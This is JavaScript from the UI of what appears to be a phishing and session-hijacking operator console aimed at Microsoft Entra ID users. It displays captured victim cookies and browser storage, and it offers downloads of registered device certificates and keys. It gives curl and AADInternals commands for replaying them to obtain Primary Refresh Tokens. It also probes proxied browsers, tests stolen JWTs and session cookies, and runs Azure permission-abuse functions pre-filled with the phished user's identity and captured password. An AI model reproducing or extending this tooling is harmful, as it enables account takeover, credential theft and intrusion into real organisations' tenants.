        ${cc?`<div style="margin-bottom:8px"><div style="color:#fbbf24;font-weight:bold;margin-bottom:4px">Cookies (${cc})</div><div style="background:#0a0a14;padding:8px;border-radius:4px;overflow:auto;max-height:200px">${(d.cookies||[]).map(c=>`<div><span style="color:#60a5fa">${esc(c.name)}</span> <span style="color:#8893a7">${esc((c.value||'').slice(0,80))}</span></div>`).join('')}</div></div>`:''}
        ${ls?`<div style="margin-bottom:8px"><div style="color:#c084fc;font-weight:bold;margin-bottom:4px">localStorage (${ls})</div><pre style="background:#0a0a14;padding:8px;border-radius:4px;overflow:auto;max-height:200px;color:#cbd5e1">${esc(JSON.stringify(d.local_storage,null,2))}</pre></div>`:''}
        ${ss?`<div style="margin-bottom:8px"><div style="color:#c084fc;font-weight:bold;margin-bottom:4px">sessionStorage (${ss})</div><pre style="background:#0a0a14;padding:8px;border-radius:4px;overflow:auto;max-height:200px;color:#cbd5e1">${esc(JSON.stringify(d.session_storage,null,2))}</pre></div>`:''}
        ${d.external_capture_metadata?`<div style="margin-bottom:8px"><div style="color:#a78bfa;font-weight:bold;margin-bottom:4px">Fingerprint & Metadata</div><div style="display:flex;gap:4px;margin-bottom:6px"><button class="btn" style="padding:2px 8px;font-size:12px;background:#2d1b4e;border:1px solid #6b21a8;color:#d8b4fe" onclick="document.getElementById('fp-summary-${site.id}').style.display='';document.getElementById('fp-json-${site.id}').style.display='none';event.target.style.background='#6b21a8';document.querySelector('[data-fp-json=${site.id}]').style.background='#2d1b4e';" data-fp-summary="${site.id}">Summary</button><button class="btn" style="padding:2px 8px;font-size:12px;background:#2d1b4e;border:1px solid #6b21a8;color:#d8b4fe" onclick="document.getElementById('fp-json-${site.id}').style.display='';document.getElementById('fp-summary-${site.id}').style.display='none';event.target.style.background='#6b21a8';document.querySelector('[data-fp-summary=${site.id}]').style.background='#2d1b4e';" data-fp-json="${site.id}">JSON</button></div><div id="fp-summary-${site.id}" style="background:#0a0a14;padding:8px;border-radius:4px;overflow:auto;max-height:400px;color:#cbd5e1;font-size:12px;line-height:1.6">${renderFingerprintSummary(d.external_capture_metadata)}</div><div id="fp-json-${site.id}" style="display:none;background:#0a0a14;padding:8px;border-radius:4px;overflow:auto;max-height:300px;color:#cbd5e1;font-size:12px"><pre style="margin:0">${esc(JSON.stringify(d.external_capture_metadata,null,2))}</pre></div></div>`:''}
        ${d.current_url?`<div style="margin-top:8px;color:#78859b">URL: ${esc(d.current_url)}</div>`:''}
        ${d.captured_at?`<div style="color:#78859b">Captured: ${new Date(d.captured_at*1000).toLocaleString()}</div>`:''}
      </div></div>`;
  }).join('');
}

// ── Device Profiles ──
function renderDevices(){
  send({cmd:'list_devices'});
  if(!devicePresets.length){
    apiFetch('/api/devices/presets').then(r=>r.json())
      .then(d=>{devicePresets=d.presets||[]}).catch(()=>{});
  }
  // Refresh captured-host list so the "Register from capture" modal has data.
  send({cmd:'list_captured_proxy'});
  renderDevicesList();
  renderDrsCredentialsList();
}

// DRS credentials — devices the operator has registered against AAD
// via the Flow Trace ⚡ Register button. Distinct from device profiles
// (those are Playwright fingerprint+cookies bundles); a credential is
// the IdP-issued cert + key pair that proves the device exists in
// Entra ID and can be replayed for PRT / token requests.
function renderDrsCredentialsList(){
  const el=document.getElementById('drs-credentials-list');
  if(!el)return;
  el.innerHTML='<div style="color:#78859b;font-size:13px">Loading…</div>';
  apiFetch('/api/devices/drs-credentials').then(r=>r.json()).then(d=>{
    const creds=d.credentials||[];
    if(!creds.length){
      el.innerHTML='<div style="color:#78859b;font-size:13px;padding:8px 0">No DRS credentials yet. Capture a DRS-scoped Bearer token (a request whose <code>aud=01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9</code>) — the Flow Trace row will show a ⚡ Register button.</div>';
      return;
    }
    el.innerHTML=creds.map(c=>{
      const when=c.registered_at?new Date(c.registered_at*1000).toLocaleString():'';
      const joinLabel=c.join_type===4?'Workplace Join (BYOD)':'AAD Join';
      return `<div class="card" style="margin-bottom:8px;border-left:3px solid #c2410c">
        <div class="card-header" onclick="document.getElementById('drs-body-${esc(c.id)}').style.display=document.getElementById('drs-body-${esc(c.id)}').style.display==='none'?'':'none'" style="cursor:pointer">
          <div style="flex:1;min-width:0">
            <div><b>${esc(c.name||c.id)}</b>
              <span class="badge" style="background:#7c2d12;color:#fed7aa;padding:2px 8px;border-radius:10px;font-size:13px;margin-left:6px">${esc(joinLabel)}</span>
              ${c.membership_type?`<span class="badge" style="background:#1e293b;color:#94a3b8;padding:2px 8px;border-radius:10px;font-size:13px;margin-left:4px">${esc(c.membership_type)}</span>`:''}
            </div>
            <div style="color:#78859b;font-size:13px;margin-top:2px">
              <code style="color:#fbbf24">device_id=${esc(c.device_id||'?')}</code>
              · upn=${esc(c.user_upn||'?')}
              · tid=${esc(c.tenant_id||'?')}
            </div>
            <div style="color:#78859b;font-size:13px;margin-top:2px">registered ${esc(when)} · oid=${esc(c.user_oid||'?')} · OS ${esc(c.os_version||'?')}</div>
          </div>
          <div style="display:flex;gap:6px;align-items:flex-start;flex-wrap:wrap">
            <a class="btn" style="text-decoration:none;font-size:12px" href="/api/devices/drs-credentials/${esc(c.id)}/pfx" onclick="event.stopPropagation()" download>PFX</a>
            <a class="btn" style="text-decoration:none;font-size:12px" href="/api/devices/drs-credentials/${esc(c.id)}/cert" onclick="event.stopPropagation()" download>Cert</a>
            <a class="btn" style="text-decoration:none;font-size:12px" href="/api/devices/drs-credentials/${esc(c.id)}/key" onclick="event.stopPropagation()" download>Key</a>
            <button class="btn btn-danger" style="font-size:12px" onclick="event.stopPropagation();drsDeleteCredential('${esc(c.id)}')">Delete</button>
          </div>
        </div>
        <div class="card-body" id="drs-body-${esc(c.id)}" style="display:none">
          <div style="color:#94a3b8;font-size:12px">
            <div><b>Replay against MS Graph:</b></div>
            <pre style="background:#0a0a14;padding:6px 8px;border-radius:3px;font-size:12px;color:#cbd5e1;overflow:auto">curl --cert ${esc(c.id)}.crt --key ${esc(c.id)}.key https://graph.microsoft.com/v1.0/me</pre>
            <div style="margin-top:8px"><b>Use with AADInternals:</b></div>
            <pre style="background:#0a0a14;padding:6px 8px;border-radius:3px;font-size:12px;color:#cbd5e1;overflow:auto">$cert = Get-PfxCertificate -FilePath ${esc(c.id)}.pfx
Get-AADIntUserPRTToken -Certificate $cert -TenantId ${esc(c.tenant_id||'<tid>')} </pre>
            <div style="margin-top:8px"><b>On disk:</b> <code>$DATA_DIR/device_credentials/${esc(c.id)}.{json,enc}</code></div>
          </div>
        </div>
      </div>`;
    }).join('');
  }).catch(err=>{
    el.innerHTML=`<div style="color:#f87171;font-size:13px">Failed to load DRS credentials: ${esc(String(err))}</div>`;
  });
}
function drsDeleteCredential(id){
  if(!confirm('Delete DRS credential '+id+'?\n\nThis only removes the local copy — the device record in Entra ID remains. Use the Azure portal to delete the device.'))return;
  apiFetch('/api/devices/drs-credentials/'+encodeURIComponent(id),{method:'DELETE'})
    .then(()=>renderDrsCredentialsList())
    .catch(err=>alert('Delete failed: '+err));
}
function _devUA(d){
  const fp=d.fingerprint||{};
  for(const k of Object.keys(fp)){if(k.toLowerCase()==='user-agent')return fp[k]||''}
  return '';
}
function renderDevicesList(){
  const el=document.getElementById('devices-list');if(!el)return;
  if(!devicesCache.length){
    el.innerHTML='<div style="color:#78859b">No device profiles yet. Use the buttons above to register one.</div>';
    return;
  }
  el.innerHTML=devicesCache.map(d=>{
    const ua=_devUA(d);
    const credCount=Object.keys(d.credentials||{}).length;
    const probedCount=Object.keys(d.probed||{}).filter(k=>d.probed[k]&&k!=='captured_at').length;
    const eng=`${esc(d.engine_family||'?')}${d.channel?'-'+esc(d.channel):''}`;
    const badges=[
      `<span class="badge" style="background:#1e293b;color:#94a3b8;padding:2px 8px;border-radius:10px;font-size:13px">${esc(d.source||'?')}</span>`,
      `<span class="badge" style="background:#0c4a6e;color:#7dd3fc;padding:2px 8px;border-radius:10px;font-size:13px">${eng}</span>`,
      probedCount?`<span class="badge" style="background:#14532d;color:#86efac;padding:2px 8px;border-radius:10px;font-size:13px">probed</span>`:'',
      credCount?`<span class="badge" style="background:#581c87;color:#d8b4fe;padding:2px 8px;border-radius:10px;font-size:13px">creds×${credCount}</span>`:'',
      d.is_mobile?`<span class="badge" style="background:#1e293b;color:#fbbf24;padding:2px 8px;border-radius:10px;font-size:13px">mobile</span>`:'',
    ].filter(Boolean).join(' ');
    const lastUsed=d.last_used_at?new Date(d.last_used_at*1000).toLocaleString():'never';
    const created=d.created_at?new Date(d.created_at*1000).toLocaleString():'';
    const vp=d.viewport||{};
    const hasBody=probedCount||credCount;
    return `<div class="card" style="margin-bottom:8px">
      <div class="card-header" ${hasBody?`onclick="const b=document.getElementById('dev-body-${esc(d.id)}');b.style.display=b.style.display==='none'?'':'none'" style="cursor:pointer"`:''}>
        <div style="flex:1;min-width:0">
          <div><b>${esc(d.name||d.id)}</b> ${badges}</div>
          <div style="color:#78859b;font-size:13px;margin-top:2px">${esc(ua.slice(0,140))}${ua.length>140?'…':''}</div>
          <div style="color:#78859b;font-size:13px;margin-top:2px">
            ${esc(vp.width||'?')}×${esc(vp.height||'?')} · ${esc(d.locale||'?')} · ${esc(d.timezone_id||'?')}
            · imp=${esc(d.impersonate_tag||'(none)')} · last_used=${esc(lastUsed)}
          </div>
        </div>
        <div style="display:flex;gap:6px;align-items:flex-start">
          <button class="btn" onclick="event.stopPropagation();launchDevice('${esc(d.id)}')">Launch</button>
          <button class="btn" onclick="event.stopPropagation();openDeviceManualModal('${esc(d.id)}')">Edit</button>
          <button class="btn btn-danger" onclick="event.stopPropagation();if(confirm('Delete device?'))send({cmd:'delete_device',device_id:'${esc(d.id)}'})">Delete</button>
        </div>
      </div>
      ${(probedCount||credCount)?`<div class="card-body" style="display:none" id="dev-body-${esc(d.id)}">
        ${probedCount?`<div style="margin-bottom:8px"><div style="color:#86efac;font-weight:bold">Probed signals</div><pre style="background:#0a0a14;padding:8px;border-radius:4px;overflow:auto;max-height:200px;color:#cbd5e1">${esc(JSON.stringify(d.probed,null,2))}</pre></div>`:''}
        ${credCount?`<div style="margin-bottom:8px"><div style="color:#d8b4fe;font-weight:bold">Bundled credentials (${credCount} hosts)</div><div style="color:#94a3b8;font-size:13px">${Object.keys(d.credentials).map(esc).join(', ')}</div></div>`:''}
        <div style="color:#78859b;font-size:12px">id=${esc(d.id)} · created=${esc(created)}</div>
      </div>`:''}
    </div>`;
  }).join('');
}
function _closeDeviceModal(){const m=document.getElementById('device-modal');m.style.display='none';m.innerHTML=''}
function launchDevice(id){
  const startUrl=document.getElementById('dev-start-url').value.trim();
  send({cmd:'launch_with_device',device_id:id,start_url:startUrl,
        frontend_host:`${location.protocol}//${location.hostname}:8091`});
}
function openDeviceFromCaptureModal(){
  send({cmd:'list_captured_proxy'});
  const m=document.getElementById('device-modal');
  m.style.display='flex';
  const opts=(capturedHosts||[]).map(h=>{
    const fp=h.fingerprint||{};
    const tag=fp.family?` · fp=${esc(fp.family)}${fp.hints?'/'+fp.hints+'h':''}`:'';
    return `<option value="${esc(h.hostname)}">${esc(h.hostname)} · ${h.cookies||0} cookies, ${h.headers||0} headers${tag}</option>`;
  }).join('') || '<option value="">(nothing captured yet — browse a site through :3128 first)</option>';
  m.innerHTML=`<div class="card" style="max-width:560px;width:90%;background:#0f172a">
    <h3 style="margin-top:0;color:#7dd3fc">Register device from capture</h3>
    <div style="display:flex;flex-direction:column;gap:10px">
      <label style="font-size:13px;color:#94a3b8">Captured host
        <select id="dev-cap-host" class="cfg-input" style="width:100%">${opts}</select>
      </label>
      <fieldset style="border:1px solid #1e293b;border-radius:6px;padding:8px">
        <legend style="color:#94a3b8;padding:0 6px;font-size:13px">Registration mode</legend>
        <label style="display:block;font-size:13px"><input type="checkbox" id="dev-mode-passive" checked> <b>Passive</b> — snapshot fingerprint + already-captured cookies/headers</label>
        <label style="display:block;font-size:13px;margin-top:4px"><input type="checkbox" id="dev-mode-probe"> <b>Active JS probe</b> — next request through :3128 returns a one-shot page that captures timezone, screen, viewport, languages, platform</label>
        <label style="display:block;font-size:13px;margin-top:4px"><input type="checkbox" id="dev-mode-creds"> <b>Probe + cred snapshot</b> — also bundle localStorage/sessionStorage from the listed sites</label>
      </fieldset>
      <label style="font-size:13px;color:#94a3b8">Friendly name (optional)
        <input id="dev-cap-name" class="cfg-input" style="width:100%" placeholder="e.g. corp laptop, jdoe iPhone">
      </label>
      <label style="font-size:13px;color:#94a3b8">Cred-snapshot sites (comma-separated; default = capture host)
        <input id="dev-cap-sites" class="cfg-input" style="width:100%" placeholder="login.microsoftonline.com, graph.microsoft.com">
      </label>
    </div>
    <div style="display:flex;gap:8px;margin-top:14px;justify-content:flex-end">
      <button class="btn" onclick="_closeDeviceModal()">Cancel</button>
      <button class="btn" style="background:#0c4a6e" onclick="submitDeviceFromCapture()">Register</button>
    </div>
  </div>`;
}
function submitDeviceFromCapture(){
  const modes=[];
  if(document.getElementById('dev-mode-passive').checked)modes.push('passive');
  if(document.getElementById('dev-mode-probe').checked)modes.push('probe');
  if(document.getElementById('dev-mode-creds').checked){if(!modes.includes('probe'))modes.push('probe');modes.push('creds')}
  const host=document.getElementById('dev-cap-host').value.trim();
  if(!host){alert('Pick a captured host');return}
  const sites=document.getElementById('dev-cap-sites').value.split(',').map(s=>s.trim()).filter(Boolean);
  send({cmd:'register_device_from_capture',
        hostname:host,modes,
        name:document.getElementById('dev-cap-name').value.trim()||null,
        sites:sites.length?sites:null});
  _closeDeviceModal();
}
function openDeviceManualModal(editId){
  const cur=editId?devicesCache.find(d=>d.id===editId):null;
  const fp=cur?(cur.fingerprint||{}):{};
  const ua=_devUA(cur||{});
  const al=Object.keys(fp).find(k=>k.toLowerCase()==='accept-language');
  const presets=devicePresets.length?devicePresets:[];
  const presetOpts=`<option value="">— none / custom —</option>`+
    presets.map(p=>`<option value="${esc(p.id)}">${esc(p.name)} (${esc(p.engine_family)}${p.channel?'-'+esc(p.channel):''})</option>`).join('');
  const m=document.getElementById('device-modal');
  m.style.display='flex';
  m.innerHTML=`<div class="card" style="max-width:640px;width:92%;background:#0f172a;max-height:90vh;overflow:auto">
    <h3 style="margin-top:0;color:#7dd3fc">${cur?'Edit device':'Add device'}</h3>
    <div style="display:flex;flex-direction:column;gap:10px">
      ${cur?'':`<label style="font-size:13px;color:#94a3b8">Preset
        <select id="dm-preset" class="cfg-input" style="width:100%" onchange="_devApplyPreset()">${presetOpts}</select>
      </label>`}
      <label style="font-size:13px;color:#94a3b8">Name
        <input id="dm-name" class="cfg-input" style="width:100%" value="${esc(cur?.name||'')}" placeholder="device label">
      </label>
      <details ${cur?'open':''} style="border:1px solid #1e293b;border-radius:6px;padding:6px">
        <summary style="color:#94a3b8;cursor:pointer">Advanced (free-form fingerprint + viewport)</summary>
        <div style="display:flex;flex-direction:column;gap:8px;margin-top:8px">
          <label style="font-size:13px;color:#94a3b8">User-Agent
            <input id="dm-ua" class="cfg-input" style="width:100%;font-family:monospace;font-size:13px" value="${esc(ua)}">
          </label>
          <label style="font-size:13px;color:#94a3b8">Accept-Language
            <input id="dm-al" class="cfg-input" style="width:100%" value="${esc(al?fp[al]:(cur?.locale?cur.locale+',en;q=0.9':''))}">
          </label>
          <div style="display:flex;gap:8px">
            <label style="flex:1;font-size:13px;color:#94a3b8">Locale
              <input id="dm-locale" class="cfg-input" style="width:100%" value="${esc(cur?.locale||'en-US')}">
            </label>
            <label style="flex:1;font-size:13px;color:#94a3b8">Timezone
              <input id="dm-tz" class="cfg-input" style="width:100%" value="${esc(cur?.timezone_id||'UTC')}">
            </label>
          </div>
          <div style="display:flex;gap:8px">
            <label style="flex:1;font-size:13px;color:#94a3b8">Viewport width
              <input id="dm-vw" type="number" class="cfg-input" style="width:100%" value="${esc(cur?.viewport?.width||1280)}">
            </label>
            <label style="flex:1;font-size:13px;color:#94a3b8">Viewport height
              <input id="dm-vh" type="number" class="cfg-input" style="width:100%" value="${esc(cur?.viewport?.height||800)}">
            </label>
            <label style="flex:1;font-size:13px;color:#94a3b8">DPR
              <input id="dm-dpr" type="number" step="0.1" class="cfg-input" style="width:100%" value="${esc(cur?.device_scale_factor||1.0)}">
            </label>
          </div>
          <div style="display:flex;gap:12px;align-items:center;font-size:13px;color:#94a3b8">
            <label><input type="checkbox" id="dm-mobile" ${cur?.is_mobile?'checked':''}> mobile</label>
            <label><input type="checkbox" id="dm-touch" ${cur?.has_touch?'checked':''}> touch</label>
          </div>
          <div style="display:flex;gap:8px">
            <label style="flex:1;font-size:13px;color:#94a3b8">Engine family
              <select id="dm-engine" class="cfg-input" style="width:100%">
                ${['chromium','firefox','webkit'].map(e=>`<option value="${e}" ${(cur?.engine_family||'chromium')===e?'selected':''}>${e}</option>`).join('')}
              </select>
            </label>
            <label style="flex:1;font-size:13px;color:#94a3b8">Channel (chromium only)
              <input id="dm-channel" class="cfg-input" style="width:100%" value="${esc(cur?.channel||'')}" placeholder="e.g. msedge">
            </label>
          </div>
          <label style="font-size:13px;color:#94a3b8">Notes
            <input id="dm-notes" class="cfg-input" style="width:100%" value="${esc(cur?.notes||'')}">
          </label>
        </div>
      </details>
    </div>
    <div style="display:flex;gap:8px;margin-top:14px;justify-content:flex-end">
      <button class="btn" onclick="_closeDeviceModal()">Cancel</button>
      <button class="btn" style="background:#0c4a6e" onclick="submitDeviceManual('${esc(editId||'')}')">${cur?'Save':'Add'}</button>
    </div>
  </div>`;
}
function _devApplyPreset(){
  const id=document.getElementById('dm-preset').value;
  const p=devicePresets.find(x=>x.id===id);if(!p)return;
  const fp=p.fingerprint||{};
  const ua=Object.keys(fp).find(k=>k.toLowerCase()==='user-agent');
  const al=Object.keys(fp).find(k=>k.toLowerCase()==='accept-language');
  if(ua)document.getElementById('dm-ua').value=fp[ua];
  if(al)document.getElementById('dm-al').value=fp[al];
  document.getElementById('dm-locale').value=p.locale||'en-US';
  document.getElementById('dm-tz').value=p.timezone_id||'UTC';
  document.getElementById('dm-vw').value=p.viewport?.width||1280;
  document.getElementById('dm-vh').value=p.viewport?.height||800;
  document.getElementById('dm-dpr').value=p.device_scale_factor||1.0;
  document.getElementById('dm-mobile').checked=!!p.is_mobile;
  document.getElementById('dm-touch').checked=!!p.has_touch;
  document.getElementById('dm-engine').value=p.engine_family||'chromium';
  document.getElementById('dm-channel').value=p.channel||'';
  if(!document.getElementById('dm-name').value)document.getElementById('dm-name').value=p.name||'';
}
function submitDeviceManual(editId){
  const presetEl=document.getElementById('dm-preset');
  const fp={};
  const ua=document.getElementById('dm-ua').value.trim();
  const al=document.getElementById('dm-al').value.trim();
  if(ua)fp['User-Agent']=ua;
  if(al)fp['Accept-Language']=al;
  const profile={
    name:document.getElementById('dm-name').value.trim()||null,
    fingerprint:fp,
    viewport:{width:Number(document.getElementById('dm-vw').value)||1280,
              height:Number(document.getElementById('dm-vh').value)||800},
    device_scale_factor:Number(document.getElementById('dm-dpr').value)||1.0,
    is_mobile:document.getElementById('dm-mobile').checked,
    has_touch:document.getElementById('dm-touch').checked,
    locale:document.getElementById('dm-locale').value.trim()||'en-US',
    timezone_id:document.getElementById('dm-tz').value.trim()||'UTC',
    engine_family:document.getElementById('dm-engine').value,
    channel:document.getElementById('dm-channel').value.trim()||null,
    notes:document.getElementById('dm-notes').value,
  };
  if(editId){
    send({cmd:'update_device',device_id:editId,patch:profile});
  }else{
    if(presetEl&&presetEl.value)profile.preset_id=presetEl.value;
    send({cmd:'register_device_manual',profile});
  }
  _closeDeviceModal();
}

// ── Credential Test Functions ──
async function testDecode(siteId){
  const el=document.getElementById('test-result-'+siteId);
  el.style.display='';el.innerHTML='<div style="color:#94a3b8">Decoding...</div>';
  try{
    const r=await apiFetch('/api/browser/test/decode/'+siteId);
    const d=await r.json();
    if(d.error){el.innerHTML=`<div style="color:#f87171">${esc(d.error)}</div>`;return}
    if(!d.decoded_count){el.innerHTML='<div style="color:#fbbf24">No JWTs found in captured data</div>';return}
    let h=`<div style="color:#4ade80;font-weight:bold;margin-bottom:6px">Decoded ${d.decoded_count} JWT(s)</div>`;
    for(const[name,tok]of Object.entries(d.tokens)){
      const p=tok.payload||{};
      const exp=p._expires_in||p._expired_ago||'unknown';
      const sub=p.sub||p.preferred_username||p.email||p.upn||p.unique_name||'';
      const aud=p.aud||'';
      const scp=p.scp||p.scope||'';
      h+=`<div style="background:#0a0a14;padding:8px;border-radius:4px;margin-bottom:6px">
        <div style="color:#7dd3fc;font-weight:600;font-size:13px;margin-bottom:4px">${esc(name)}</div>
        ${sub?`<div style="font-size:13px"><span style="color:#94a3b8">Subject:</span> <span style="color:#e2e8f0">${esc(sub)}</span></div>`:''}
        ${aud?`<div style="font-size:13px"><span style="color:#94a3b8">Audience:</span> <span style="color:#e2e8f0">${esc(String(aud))}</span></div>`:''}
        ${scp?`<div style="font-size:13px"><span style="color:#94a3b8">Scope:</span> <span style="color:#e2e8f0">${esc(scp)}</span></div>`:''}
        <div style="font-size:13px"><span style="color:#94a3b8">Expiry:</span> <span style="color:${p._expired_ago?'#f87171':'#4ade80'}">${esc(exp)}</span></div>
        <details style="margin-top:4px"><summary style="color:#78859b;font-size:13px;cursor:pointer">Full payload</summary>
          <pre style="color:#cbd5e1;font-size:13px;overflow:auto;max-height:200px;margin-top:4px">${esc(JSON.stringify(p,null,2))}</pre>
        </details>
      </div>`;
    }
    el.innerHTML=h;
  }catch(e){el.innerHTML=`<div style="color:#f87171">Error: ${esc(e.message)}</div>`}
}
// Graph dropdown dispatch — the custom-URL input overrides the selected call.
function graphRun(siteId){
  const custom=document.getElementById('test-url-'+siteId)?.value?.trim();
  const sel=document.getElementById('graph-fn-'+siteId)?.value||'';
  testToken(siteId, custom||sel);
}
async function testToken(siteId, overrideUrl){
  const el=document.getElementById('test-result-'+siteId);
  const customUrl=(overrideUrl&&overrideUrl.trim())||document.getElementById('test-url-'+siteId)?.value?.trim();
  el.style.display='';el.innerHTML='<div style="color:#94a3b8">Testing token...</div>';
  try{
    let url='/api/browser/test/token/'+siteId;
    if(customUrl)url+='?url='+encodeURIComponent(customUrl);
    const r=await apiFetch(url,{method:'POST'});
    const d=await r.json();
    if(d.error){
      el.innerHTML=`<div style="color:#f87171">${esc(d.error)}</div>`;
      if(d.available_headers)el.innerHTML+=`<div style="color:#78859b;font-size:13px;margin-top:4px">Available: ${esc(d.available_headers.join(', '))}</div>`;
      return;
    }
    const ok=d.success;
    el.innerHTML=`<div style="margin-bottom:4px">
      <span style="color:${ok?'#4ade80':'#f87171'};font-weight:bold">${d.status_code} ${ok?'SUCCESS':'FAILED'}</span>
      <span style="color:#78859b;font-size:13px;margin-left:8px">via ${esc(d.token_source||'?')}</span>
    </div>
    <div style="font-size:13px;color:#94a3b8;margin-bottom:4px">URL: ${esc(d.test_url)}</div>
    <pre style="background:#0a0a14;padding:8px;border-radius:4px;overflow:auto;max-height:250px;color:#cbd5e1;font-size:13px">${esc(typeof d.response==='string'?d.response:JSON.stringify(d.response,null,2))}</pre>`;
  }catch(e){el.innerHTML=`<div style="color:#f87171">Error: ${esc(e.message)}</div>`}
}
// Get-MgDevice / Get-MgDeviceManagementDevice are now options in the Graph
// dropdown above (routed through testToken's generic Graph-GET path).
async function testCookies(siteId){
  const el=document.getElementById('test-result-'+siteId);
  const customUrl=document.getElementById('test-url-'+siteId)?.value?.trim();
  el.style.display='';el.innerHTML='<div style="color:#94a3b8">Testing cookies...</div>';
  try{
    let url='/api/browser/test/cookies/'+siteId;
    if(customUrl)url+='?url='+encodeURIComponent(customUrl);
    const r=await apiFetch(url,{method:'POST'});
    const d=await r.json();
    if(d.error){el.innerHTML=`<div style="color:#f87171">${esc(d.error)}</div>`;return}
    const ok=d.session_valid;
    el.innerHTML=`<div style="margin-bottom:4px">
      <span style="color:${ok?'#4ade80':d.redirects_to_login?'#f87171':'#fbbf24'};font-weight:bold">${d.status_code} ${ok?'SESSION VALID':d.redirects_to_login?'REDIRECTS TO LOGIN':'CHECK RESPONSE'}</span>
      <span style="color:#78859b;font-size:13px;margin-left:8px">${d.cookie_count} cookies sent</span>
    </div>
    <div style="font-size:13px;color:#94a3b8;margin-bottom:4px">URL: ${esc(d.test_url)}</div>
    ${d.location?`<div style="font-size:13px;color:#94a3b8;margin-bottom:4px">Redirect: ${esc(d.location)}</div>`:''}
    <pre style="background:#0a0a14;padding:8px;border-radius:4px;overflow:auto;max-height:250px;color:#cbd5e1;font-size:13px">${esc(d.body_preview||'(empty)')}</pre>`;
  }catch(e){el.innerHTML=`<div style="color:#f87171">Error: ${esc(e.message)}</div>`}
}

// ── AAA: AbuseAzureAPIPermissions runner ──
let aaaInfoCache=null;
async function aaaLoadInfo(){
  if(aaaInfoCache)return aaaInfoCache;
  try{
    const r=await apiFetch('/api/aaa/info');
    aaaInfoCache=await r.json();
  }catch(e){
    aaaInfoCache={ready:false,pwsh:{ok:false,detail:String(e)},script:{ok:false,detail:''},allowed_functions:[]};
  }
  return aaaInfoCache;
}
async function aaaTogglePanel(siteId){
  const panel=document.getElementById('aaa-panel-'+siteId);
  const status=document.getElementById('aaa-status-'+siteId);
  if(!panel)return;
  const opening=panel.style.display==='none';
  panel.style.display=opening?'':'none';
  if(!opening)return;
  // Populate the function dropdown on first open.
  const sel=document.getElementById('aaa-fn-'+siteId);
  if(sel && sel.options.length===0){
    sel.innerHTML='<option value="">Loading…</option>';
    const info=await aaaLoadInfo();
    if(!info.ready){
      sel.innerHTML='<option value="">(unavailable)</option>';
      const reasons=[];
      if(!info.pwsh?.ok)reasons.push(esc(info.pwsh.detail||'pwsh missing'));
      if(!info.script?.ok)reasons.push(esc(info.script.detail||'script missing'));
      status.innerHTML='<span style="color:#f87171">disabled — '+reasons.join('; ')+'</span>';
      return;
    }
    // Get-AAATokenFromAzLogin is a token *getter* (acquires a Graph token via
    // Connect-AzAccount), not a recon function that consumes one — so it heads
    // the list and Run routes it to /api/aaa/login (see aaaRun).
    const _getter=`<option value="Get-AAATokenFromAzLogin">Get-AAATokenFromAzLogin — acquire a token (login)</option>`;
    sel.innerHTML=_getter+(info.allowed_functions||[]).map(f=>`<option value="${esc(f)}">${esc(f)}</option>`).join('');
    status.innerHTML='<span style="color:#78859b">'+info.allowed_functions.length+' functions available · pwsh '+esc(info.pwsh.detail.split(' ')[0]||'ok')+'</span>';
    aaaFnChange(siteId); // pre-fill args for the initial selection
  }
}
// Populate the args field from the selected function's parsed params:
// mandatory params pre-filled (switches bare, strings as -Name ''), the full
// param set surfaced in the tooltip. Get-AAATokenFromAzLogin gets a
// -User/-Password/-TenantId template seeded from the captured creds.
function aaaFnChange(siteId){
  const sel=document.getElementById('aaa-fn-'+siteId);
  const argsEl=document.getElementById('aaa-args-'+siteId);
  if(!sel||!argsEl)return;
  const fn=sel.value;
  const capUser=sel.dataset.user||'';
  const q=s=>String(s).replace(/'/g,"''");
  if(fn==='Get-AAATokenFromAzLogin'){
    const t=q(sel.dataset.tid||'');
    // -User and -TenantId are seeded from the captured session. A captured
    // password is applied at Run (kept out of the visible args box); when
    // none was captured, show an empty -Password '' so the operator is
    // prompted to fill it in.
    argsEl.value=`-User '${q(capUser)}' -TenantId '${t}'`+(sel.dataset.pass?'':" -Password ''");
    argsEl.title=(sel.dataset.pass
      ? "Captured password is used automatically at Run — add -Password '…' to override. "
      : "No captured password on this credential — fill the -Password '…'. ")
      + "USER login (captured creds) — do NOT add -ServicePrincipal (that's for an app client-id + secret). Run routes to /api/aaa/login.";
    return;
  }
  const fp=(aaaInfoCache&&aaaInfoCache.function_params)||{};
  const params=fp[fn]||[];
  const mand=params.filter(p=>p.mandatory);
  // Respect PowerShell parameter sets: mandatory switches in different named
  // sets are mutually exclusive, so pre-fill only the first named set (+ any
  // setless mandatory params, which are common to all sets).
  const sets=[...new Set(mand.filter(p=>p.set).map(p=>p.set))];
  const chosen=sets.length>1?mand.filter(p=>!p.set||p.set===sets[0]):mand;
  // Pre-fill a -User/-UserId param with the captured victim identity so the
  // recon call targets the phished user by default.
  argsEl.value=chosen.map(p=>p.switch?('-'+p.name)
    :(/^user(id)?$/i.test(p.name)&&capUser?`-${p.name} '${q(capUser)}'`:`-${p.name} ''`)).join(' ');
  argsEl.title=params.length
    ?'params ('+String.fromCharCode(42)+' = required): '+params.map(p=>(p.mandatory?String.fromCharCode(42):'')+'-'+p.name+(p.switch?'':" ''")+(p.set?(' ['+p.set+']'):'')).join('  ')
    :'no parameters — just Run';
}
function aaaParseArgs(s){
  // Tokenize a PowerShell-ish arg line: -Name 'value with spaces' -Other "v" Bare
  const out=[];
  const re=/(?:-([A-Za-z][A-Za-z0-9_]*))|(?:'((?:[^']|'')*)')|(?:"((?:[^"\\]|\\.)*)")|(\S+)/g;
  let m,pendingName=null;
  while((m=re.exec(s))!==null){
    if(m[1]!==undefined){
      // -Name. Push prior name as a switch (no value).
      if(pendingName!==null)out.push({name:pendingName});
      pendingName=m[1];
    }else{
      const val=m[2]!==undefined?m[2].replace(/''/g,"'"):(m[3]!==undefined?m[3].replace(/\\(.)/g,'$1'):m[4]);
      out.push(pendingName?{name:pendingName,value:val}:{value:val});
      pendingName=null;
    }
  }
  if(pendingName!==null)out.push({name:pendingName});
  return out;
}
async function aaaRun(siteId){
  const fn=document.getElementById('aaa-fn-'+siteId)?.value;
  const argsStr=document.getElementById('aaa-args-'+siteId)?.value||'';
  const tokIdx=parseInt(document.getElementById('aaa-tok-'+siteId)?.value||'0',10)||0;
  const out=document.getElementById('aaa-result-'+siteId);
  if(!fn){out.innerHTML='<div style="color:#f87171">pick a function first</div>';return}
  // The token-getter isn't a /api/aaa/run recon call — it acquires a token via
  // Connect-AzAccount, so route it to /api/aaa/login parsing the -User /
